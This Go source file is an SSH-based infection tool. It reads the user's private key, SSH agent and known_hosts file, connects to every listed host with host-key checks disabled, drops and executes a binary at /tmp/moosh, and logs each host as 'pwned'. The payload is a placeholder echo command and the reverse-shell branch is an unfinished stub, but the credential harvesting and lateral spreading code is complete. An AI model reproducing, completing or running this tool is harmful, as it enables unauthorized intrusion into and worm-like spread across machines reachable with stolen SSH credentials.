package main

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/pkg/errors"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

// TODO: add shellcode of the exploit - maybe generate it?
var Moosh64 = []byte("'echo hello > /tmp/hello'")
var Moosh86 = []byte("'echo hello > /tmp/hello'")

type SSHConfig struct {
	AgentSocket string
	PrivateKey  string
	Username    string
	Addr        string
}

type SSHRunner struct {
	*ssh.Client
}

func NewSSHRunner(c SSHConfig) (*SSHRunner, error) {
	var auth []ssh.AuthMethod

	if c.AgentSocket != "" {
		a, err := net.Dial("unix", c.AgentSocket)
		if err != nil {
			return nil, errors.Wrap(err, "failed to connect to SSH agent")
		}
		auth = append(auth, ssh.PublicKeysCallback(agent.NewClient(a).Signers))
	}

	if c.PrivateKey != "" {
		b, err := ioutil.ReadFile(c.PrivateKey)
		if err != nil {
			return nil, errors.Wrap(err, "failed to read private key")
		}

		key, err := ssh.ParsePrivateKey(b)
		if err != nil {
			return nil, errors.Wrap(err, "failed to parse private key")
		}

		auth = append(auth, ssh.PublicKeys(key))
	}

	cl, err := ssh.Dial("tcp", c.Addr, &ssh.ClientConfig{
		Auth:            auth,
		User:            c.Username,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	if err != nil {
		return nil, errors.Wrap(err, "failed to connect to host via SSH")
	}

	return &SSHRunner{
		Client: cl,
	}, nil
}

func (r SSHRunner) Run(cmd string) error {
	s, err := r.Client.NewSession()
	if err != nil {
		return errors.Wrap(err, "failed to create new SSH session")
	}

	if out, err := s.CombinedOutput(cmd); err != nil {
		return errors.Wrapf(err, "failed to run command, output: %s", out)
	}
	return nil
}

func (r SSHRunner) RunShellCode(b []byte) error {
	return r.Run(fmt.Sprintf("echo %s > /tmp/moosh && chmod +x /tmp/moosh && /tmp/moosh", string(b)))
}

type Runner interface {
	Run(cmd string) error
}

type ShellCodeRunner interface {
	RunShellCode(b []byte) error
}

func main() {
	var home string

	u, err := user.Current()
	if err != nil {
		log.Println("Failed to get current user: %s", err)
		home = os.Getenv("HOME")
	} else {
		home = u.HomeDir
	}

	knownHosts := filepath.Join(home, ".ssh", "known_hosts")
	sshKey := filepath.Join(home, ".ssh", "id_rsa")
	sshAgent := os.Getenv("SSH_AUTH_SOCK")

	flag.StringVar(&knownHosts, "sshKnown", knownHosts, "Path to SSH known_hosts file")
	flag.StringVar(&sshAgent, "sshAgent", sshAgent, "Path to SSH agent socket")
	flag.StringVar(&sshKey, "sshKey", sshKey, "Path to (passwordless) SSH private key")
	sshUser := flag.String("sshUser", "averagejoe", "Username to connect as(e.g. for SSH)")
	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
	useSSHAgent := flag.Bool("useSSHAgent", false, "Whether or not use SSH agent")
	useSSHKey := flag.Bool("useSSHKey", false, "Whether or not use (passwordless) SSH private key")
	useKnownHosts := flag.Bool("useSSHKnown", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
	addr := flag.String("addr", "", "The lucky guy")
	arch := flag.String("arch", "x64", "Bitness of the system, (x64 or x86)")
	flag.Parse()

	if *arch != "x86" && *arch != "x64" || *addr == "" && !*useKnownHosts {
		flag.Usage()
		os.Exit(1)
	}

	moosh := Moosh64
	if *arch == "x86" {
		moosh = Moosh86
	}

	switch {
	case *useSSH:
		var addrs []string
		if *addr != "" {
			addrs = append(addrs, *addr)
		}

		if *useKnownHosts {
			b, err := ioutil.ReadFile(knownHosts)
			if err != nil {
				log.Fatalf("Failed to read known_hosts file")
			}

		outer:
			for {
				m, hosts, _, _, rest, err := ssh.ParseKnownHosts(b)
				b = rest

				switch {
				case err == io.EOF:
					break outer
				case err != nil:
					log.Printf("Failed to parse known_hosts file entry: %s", err)
					break outer
				case m == "revoked":
					continue outer
				}

				for _, h := range hosts {
					if !strings.Contains(h, ":") {
						h += ":22"
					}
					addrs = append(addrs, h)
				}
			}
		}

		if len(addrs) == 0 {
			log.Fatal("No hosts to infect")
		}

		conf := SSHConfig{
			Username: *sshUser,
		}
		if *useSSHKey {
			conf.PrivateKey = sshKey
		}
		if *useSSHAgent {
			conf.AgentSocket = sshAgent
		}

		for _, a := range addrs {
			conf := conf
			conf.Addr = a

			r, err := NewSSHRunner(conf)
			if err != nil {
				log.Printf("Failed to initialize SSH connection: %s", err)
				continue
			}

			if err = r.RunShellCode(moosh); err != nil {
				log.Fatalf("Failed to pwn %s: %s", a, err)
			}
			log.Printf("%s pwned", a)
		}
	default:
		// TODO: attempt to connect to the backdoor
		// and return the reverse shell
		sh := exec.Command("#open reverse shell")
		sh.Stderr = os.Stderr
		sh.Stdout = os.Stdout
		sh.Stdin = os.Stdin
		if err := sh.Start(); err != nil {
			log.Fatalf("Failed to open reverse shell: %s", err)
		}
	}
}
